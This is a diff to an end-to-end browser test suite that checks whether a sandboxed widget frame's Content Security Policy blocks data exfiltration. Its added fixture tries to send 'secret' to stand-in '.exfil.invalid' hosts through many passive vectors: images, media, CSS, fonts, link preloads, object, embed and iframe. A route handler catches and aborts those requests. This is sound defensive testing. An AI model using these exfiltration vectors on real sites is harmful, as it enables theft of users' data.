@@ -222,6 +222,57 @@ const HOSTILE_BUNDLE = `/* E2E fixture: hostile escape attempts. */
         setTimeout(function () { finish(false); }, 2000);
       })
     );
+    // Passive exfiltration: every subresource kind a Widget can aim at an
+    // attacker host must be refused by the served policy. connect-src
+    // alone does not cover these; each attempt names its own host so a
+    // missing violation names the escaped vector.
+    var violated = [];
+    document.addEventListener("securitypolicyviolation", function (event) {
+      violated.push(event.blockedURI);
+    });
+    var passiveHosts = [];
+    function aim(name, attempt) {
+      var host = name + ".exfil.invalid";
+      passiveHosts.push([name, host]);
+      try {
+        attempt("https://" + host + "/leak?d=secret");
+      } catch (err) {
+        /* a construction-time refusal is also a block */
+        violated.push(host);
+      }
+    }
+    aim("img", function (u) { var i = new Image(); i.src = u; });
+    aim("imgplain", function (u) { var i = new Image(); i.src = u.replace("https:", "http:"); });
+    aim("srcset", function (u) { var i = new Image(); i.srcset = u + " 1x"; });
+    aim("video", function (u) { var v = document.createElement("video"); v.src = u; v.preload = "auto"; document.body.appendChild(v); });
+    aim("audio", function (u) { var a = new Audio(); a.src = u; a.preload = "auto"; });
+    aim("poster", function (u) { var v = document.createElement("video"); v.poster = u; document.body.appendChild(v); });
+    aim("css", function (u) { var d = document.createElement("div"); d.style.backgroundImage = "url(" + u + ")"; d.style.width = "10px"; d.style.height = "10px"; document.body.appendChild(d); });
+    aim("font", function (u) {
+      var st = document.createElement("style");
+      st.textContent = "@font-face{font-family:x;src:url(" + u + ")}.x{font-family:x}";
+      document.head.appendChild(st);
+      var d = document.createElement("span"); d.className = "x"; d.textContent = "x"; document.body.appendChild(d);
+    });
+    aim("stylesheet", function (u) { var l = document.createElement("link"); l.rel = "stylesheet"; l.href = u; document.head.appendChild(l); });
+    aim("preload", function (u) { var l = document.createElement("link"); l.rel = "preload"; l.as = "image"; l.href = u; document.head.appendChild(l); });
+    aim("prefetch", function (u) { var l = document.createElement("link"); l.rel = "prefetch"; l.href = u; document.head.appendChild(l); });
+    aim("object", function (u) { var o = document.createElement("object"); o.data = u; document.body.appendChild(o); });
+    aim("embed", function (u) { var e = document.createElement("embed"); e.src = u; document.body.appendChild(e); });
+    aim("iframe", function (u) { var f = document.createElement("iframe"); f.src = u; document.body.appendChild(f); });
+    waits.push(
+      new Promise(function (resolve) {
+        setTimeout(function () {
+          passiveHosts.forEach(function (entry) {
+            var seen = violated.some(function (uri) {
+              return String(uri).indexOf(entry[1]) !== -1;
+            });
+            if (!seen) escaped.push("passive-" + entry[0]);
+          });
+          resolve();
+        }, 1500);
+      })
+    );
     Promise.all(waits).then(settleOnce);
     setTimeout(settleOnce, 8000);
   };
@@ -343,6 +394,13 @@ test("the built worker serves verified frames bare navigations sandbox", async (
     consoleMessages.push(`${message.type()}: ${message.text()}`),
   );
   page.on("pageerror", (error) => consoleMessages.push(`pageerror: ${error}`));
+  // The attacker host never resolves, but a request that left the
+  // browser still reaches this handler. Nothing may.
+  const exfilRequests: string[] = [];
+  await page.route(/\.exfil\.invalid\//, (route) => {
+    exfilRequests.push(route.request().url());
+    return route.abort();
+  });
   await page.goto(`${origin}/player/probe`);
   await expect(page.getByText("frame probe")).toBeVisible();
 
@@ -696,6 +754,7 @@ test("the built worker serves verified frames bare navigations sandbox", async (
       },
     },
   );
+  expect(exfilRequests, "passive requests that left the frame").toEqual([]);
   if (report.length > 0) {
     console.log(`probe failures: ${JSON.stringify(report)}`);
     console.log(`console: ${JSON.stringify(consoleMessages.slice(0, 20))}`);
